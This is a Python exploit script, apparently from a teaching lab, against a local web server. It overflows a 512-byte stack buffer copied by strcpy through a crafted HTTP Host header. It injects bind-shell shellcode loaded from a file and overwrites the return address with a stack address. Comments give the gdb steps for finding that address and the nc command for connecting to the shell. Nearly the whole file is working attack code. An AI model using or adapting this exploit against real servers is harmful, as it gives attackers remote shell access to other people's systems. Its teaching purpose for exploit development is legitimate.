#!/usr/bin/python3
from socket import *
import struct

addr = '127.0.0.1'
expfile = 'exploit64'

s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))

# can be used for part 1 to create the infinite loop to test location (comment out other exploit - lines 18-22)

#exploit = b"\xeb\xfe" # run `htop` to see 100% core usage as correct location proof

# exploit64 has been provided - contains shellcode to create a bind shell
# user can connect via: `nc localhost 1337` -- port is staticly created within exploit64
# can view open connections with: `netstat -anop`
# once connected, run a `whoami` or `ls` to verify that you're in the same dir as webserver_lab7
#exploit = b"\xeb\xfe"
with open(expfile, "rb") as fh:
    exploit = fh.read()

'''Ghidra decompiler snippet of the function containing the stack buffer and call to strcpy
	undefined8 FUN_004020bc(char *pcParm1)
	{
	char local_208 [512];
	
	strcpy(local_208,pcParm1);
	return 1;
	} 
'''
# address should be in RDI (local_208) as the argument passed to strcpy() - steps below:
#address = 0xffffffffffffffff # uncomment this address to be used as a random 8B value on the initial run and comment out line 36 
# step 1: gdb ./webserver1
# step 2: gdb> breakpoint strcpy 
# step 3: gdb> starti
# step 4: gdb> continue
# step 5: gdb> info registers --- view the address in RDI
# step 6: either validate that this address matches line 36 or change line 36 to match the new RDI value and rerun 
# This value will likely change so you may need to update it (uncomment for actual run --- comment out line 28)
address = 0x7ffff7dbdc80 # note: might be slighly off/different (usually - 0x7ffff7dbdc80) for the LDRNet virtual students

# Overwrite all 512B of buffer (from Ghidra in the strcpy function call) + 8B (RBP), then you can overwrite RIP (ret addr) with `address`
PADLEN = 512 + 8

x = b'GET /asdf.vbs HTTP/1.1\r\n' # \r\n is a standard need after webserver GET commands
x += b'Host:' + exploit + b'A'*(PADLEN - len(exploit)) # writes exploit at the start of buffer --- subtracts 520B of A's from size of exploit
x += struct.pack("<Q", address)
x += b'\r\n' # also needed here after this webserver command
x += b'\r\n' # needed to signify to webserver done sending commands

s.send(x)
#if you break on ret -> b *0x004020ed
#You should than see your shellcode at that address when you ret
#→   0x4020ed                  ret    
#   ↳  0x7ffff7dbec80                  xor    rax, rax
#      0x7ffff7dbec83                  xor    rdi, rdi
#      0x7ffff7dbec86                  xor    rsi, rsi
#      0x7ffff7dbec89                  xor    rdx, rdx
#      0x7ffff7dbec8c                  xor    r8, r8
#      0x7ffff7dbec8f                  push   0x2